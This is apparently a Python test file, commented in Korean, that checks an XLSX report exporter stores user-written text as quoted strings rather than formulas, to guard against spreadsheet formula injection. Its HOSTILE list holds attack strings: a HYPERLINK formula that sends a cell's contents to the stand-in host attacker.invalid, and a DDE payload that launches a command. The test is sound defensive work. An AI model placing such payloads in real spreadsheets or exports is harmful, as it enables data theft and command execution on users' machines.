"""10번 요구사항 4.5: XLSX 내보내기는 사람·장비가 쓴 글을 수식으로 저장하지 않는다 (OWASP 수식 주입 안내).

보고서 제목·입력 항목 값·회차 기록(제목·시험 항목·조건·결과)이 '='·'+'·'-'·'@'·탭·CR로 시작해도
값은 그대로 두고 문자열 셀(quotePrefix)로 저장해야 한다. 시험 데이터는 합성 값이다.
"""

from __future__ import annotations

import io
from typing import Any

from openpyxl import load_workbook

from app.adapters import report_renderers as rr

HOSTILE = [
    '=HYPERLINK("http://attacker.invalid/?x="&B5,"open")',
    "=1+cmd|' /C calc'!A0",
    "+1+2",
    "-2+3",
    "@SUM(1,2)",
    "\t=1+1",
    "\r=1+1",
]


def _doc(title: str, field_value: str, record: dict[str, Any]) -> dict[str, Any]:
    return {
        "title": title, "status_label": "초안", "version": 1, "generated_at": "2026-11-02 09:00 KST",
        "data_as_of": "2026-11-02 09:00 KST", "damage_note": None, "variables": {},
        "sections": [
            {"kind": "TEXT", "title": "개요", "text": "=SUM(A1:A3)"},
            {"kind": "FIELDS", "title": "입력", "fields": [
                {"key": "summary", "label": "요약", "value": field_value, "auto_value": "=1+1", "edited": True}]},
            {"kind": "METRICS", "title": "지표", "metrics": [
                {"metric_code": "M_TEST", "name": "합성 지표", "value": -1.5, "unit": "m", "status": "OK",
                 "formula": "=a/b", "metric_version": 1, "input_count": 1, "missing_count": 0,
                 "sources": {"event_ids": [], "asset_ids": [], "observation_ranges": []}}]},
            {"kind": "RECORDS", "title": "기록", "records": [record]},
        ],
    }


def _cells(data: bytes) -> list[Any]:
    wb = load_workbook(io.BytesIO(data))
    return [cell for ws in wb.worksheets for row in ws.iter_rows() for cell in row if cell.value is not None]


def test_hostile_text_is_stored_as_text_not_formula() -> None:
    for bad in HOSTILE:
        record = {"record_id": "rec_00000000000000000000000001", "version": 1, "title": bad, "test_item": bad,
                  "conditions": bad, "result": bad, "evidence_count": 0}
        cells = _cells(rr.render_xlsx(_doc(bad, bad, record)))
        formulas = [(c.parent.title, c.coordinate, c.value) for c in cells if c.data_type == "f"]
        assert formulas == [], (bad, formulas)
        # XML은 읽을 때 CR을 LF로 바꾸므로 그 차이만 허용한다
        hostile = [c for c in cells if c.value in (bad, bad.replace("\r", "\n"))]
        # 제목·입력 값·기록 제목·시험 항목·조건·결과 = 6칸. 값은 바뀌지 않고 문자열 + quotePrefix
        assert len(hostile) == 6, (bad, [(c.parent.title, c.coordinate) for c in hostile])
        assert all(c.data_type == "s" and c.quotePrefix for c in hostile)


def test_normal_text_and_numbers_are_unchanged() -> None:
    record = {"record_id": "rec_00000000000000000000000002", "version": 2, "title": "선박 접근 시험",
              "test_item": "탐지 거리", "conditions": "주간, 파고 0.5m", "result": "PASS", "evidence_count": 3}
    data = rr.render_xlsx(_doc("합성 회차 보고서 2026-11", "정상 입력 a=b", record))
    wb = load_workbook(io.BytesIO(data))
    ws = wb["보고서"]
    assert ws["A1"].value == "합성 회차 보고서 2026-11"
    assert ws["A1"].data_type == "s" and not ws["A1"].quotePrefix
    rows = [[c.value for c in row] for row in wb["회차 기록"].iter_rows()]
    assert rows[1] == ["rec_00000000000000000000000002", 2, "선박 접근 시험", "탐지 거리", "주간, 파고 0.5m", "PASS",
                       3]
    metric_row = [c for c in next(wb["지표"].iter_rows(min_row=2, max_row=2))]
    assert metric_row[2].value == -1.5 and metric_row[2].data_type == "n"  # 숫자는 숫자 그대로
    assert metric_row[5].value == "=a/b" and metric_row[5].data_type == "s"  # 계산식 설명도 글자로
    assert not [c for c in _cells(data) if c.data_type == "f"]
